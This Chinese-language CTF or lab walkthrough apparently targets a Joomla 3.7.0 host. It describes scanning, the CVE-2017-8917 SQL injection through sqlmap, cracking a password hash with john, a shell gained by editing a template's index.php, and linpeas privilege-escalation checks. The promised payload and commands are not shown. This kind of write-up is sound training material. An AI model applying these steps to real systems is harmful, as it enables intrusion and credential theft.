对于渗透测试，”万年不变”的一步，扫描。发现几个简单的端口22，80，3306.当然，默认打开网站是一个http服务，一开始看到登录框有个Remember Me，我顿时应激，于是抓包看看有没有存在明显的shiro反序列化，很可惜，并没有

接下来对目录进行扫描，暴露了好多目录

一个个尝试，发现administrator 页面是一个后台登录框。是一个Joomla的cms框架，于是检索一下资料，发现一个针对Joomla的工具 joomscan-0.0.7

直接把’’底裤”都给掀了，版本报出3.7.0.于是去漏洞库搜索发现是一个古老的CVE-2017-8917,是一个sql注入漏洞，payload如下

接下来就直接利用sqlmap一把梭，最终得到一个用户名和密码 ，密码经过hash加密，这里利用工具john

这里简单解释一下参数 ，–wordlist后面跟着字典 ./john/hash.txt就是加密的数据

对于后台，我们就需要寻找一些功能点进行getshell，一开始寻找上传功能点，修改对一些上传文件的配置，进而允许上传php文件，但怎么尝试似乎都不行

最终发现在模板处存在index.php，我们可以修改index.php文件，进而getshell

shell中我们的用户名为apache，在home目录存在一个可疑的用户 jjameson，不过没有权限读取

这里有个linpeas.sh工具（是一款在渗透测试和 CTF 比赛中用于自动化寻找 Linux 系统提权路径的神器）

它的工作原理与核心探测内容

它本质上是一个极其庞大且逻辑严密的 Bash 脚本。在靶机上运行后，它会自动执行数百条系统状态检测命令，把系统翻个底朝天，重点搜寻以下几个“提权高发区”：

  • SUID/SGID 特殊文件： 寻找那些“拥有 root 运行权限，但普通用户也可以执行”的命令或程序。这是 CTF 中最经典的提权考点（这类发现通常会配合 GTFOBins 网站来寻找提权指令）。
  • 配置不当的定时任务 (Cron Jobs)： 检查是否有 root 用户定时在后台执行的脚本，而你（低权限用户）恰好对该脚本拥有修改或写入权限。
  • 系统与内核漏洞： 检查当前的 Linux 发行版和内核版本，对比已知的漏洞特征（比如系统是否容易受到著名的 DirtyCow 脏牛漏洞或 PwnKit 漏洞的攻击）。
  • 明文密码与敏感信息： 暴力翻找系统中的日志文件、Web 配置文件、用户的历史命令记录（如 .bash_history），寻找管理员粗心遗留的密码或 API 密钥。
  • 可利用的 Sudo 权限： 检查 /etc/sudoers 配置，看看你当前的普通用户是否被赋予了免密执行某些特定 root 命令的特权。
